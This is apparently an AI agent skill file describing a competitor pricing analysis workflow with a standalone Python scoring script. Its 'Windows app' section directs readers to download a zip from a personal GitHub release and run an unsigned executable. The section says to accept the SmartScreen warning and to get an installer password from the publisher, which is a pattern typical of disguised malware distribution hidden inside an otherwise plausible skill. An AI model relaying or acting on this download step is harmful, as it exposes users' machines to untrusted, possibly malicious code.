---
name: competitor-pricing-analysis
description: Scores collected competitor prices against weighted criteria so a US team can see where its own pricing sits in the market. Use when the user asks for competitor pricing analysis, pricing benchmark spreadsheet, pricing tier comparison. For US SaaS and ecommerce pricing owners, founders and revenue managers.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Competitor Pricing Analysis

**Scores collected competitor prices against weighted criteria so a US team can see where its own pricing sits in the market.** Written for US SaaS and ecommerce pricing owners, founders and revenue managers.

Use this skill when someone asks for:

- competitor pricing analysis
- pricing benchmark spreadsheet
- pricing tier comparison
- price positioning analysis

---

## The job

Prices get set from gut feel and one competitor page, so the offer undercuts on features it cannot afford or prices out its best-fit buyer.

## What you get

1. Collect the competitor price points the user has verified, with plan name, billing basis and the date captured.
2. Score each row against the user's weighted criteria: entry price, price per unit, included units, committed term and setup fee.
3. Rank the rows and place the user's own plan on the same scale.
4. List the terms the user still has to confirm before any price change goes out.

Output contract:

- ranked_table - competitors ranked by weighted score with each score visible
- price_map - plan price and billing basis for every row, with the capture date
- position_note - where the user's plan sits and the reasoning behind that read
- decision_gaps - the terms and fees that have to be confirmed before repricing

## US specifics that matter

- US list prices on public sites are advertised prices and can change without notice, so every captured price needs a date.
- Multi-year SaaS contracts are often priced below public list, so a list-price comparison is not a contract comparison.
- Sales tax and setup fees differ by state, so compare pre-tax prices unless both plans were quoted for the same state.
- Per-seat and per-account pricing cannot be compared until the unit of sale matches on both sides.

## Guardrails (hard rules)

- Never collect a competitor's customer data, credentials, or pricing that sits behind a login.
- Never invent a competitor's price or discount; leave the cell empty if the user has not verified it.
- Never publish the comparison outside the company without a review.
- Never state a price recommendation without showing the inputs and the weights that produced it.

## Quickstart

### 1. Fill in the brief

`templates/pricing-grid.csv` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/score_pricing_grid.py --input pricing-grid.csv --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/pricing-comparison.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Normalize before comparing**

- Put every price on the same basis: per seat, per account or per usage block.
- Record whether sales tax, setup and onboarding are included.
- Capture the date and the page or deck the price came from.
- Note the billing term: monthly, annual prepay, or multi-year contract.
- Decide the ranking direction for price criteria before you read the table.

**What a fair comparison includes**

- Included units and the overage rate.
- Support response expectations, not just plan names.
- Minimum commitment and prepayment requirement.
- Implementation, onboarding and data migration cost.
- Cancellation terms and the length of the price lock.

**Traps**

- A no-cost tier attracts a different buyer, so compare it separately.
- Promotional pricing expires, so record the deadline.
- A discounted enterprise quote is not a public list price.
- A price that was captured last quarter is a historical record, not a current price.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/pricing-comparison.md` - How US teams compare competitor prices
- `templates/pricing-grid.csv` - the brief to fill in
- `scripts/score_pricing_grid.py` - the working script

## Verify the bundle

```bash
python3 scripts/score_pricing_grid.py --input pricing-grid.csv --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
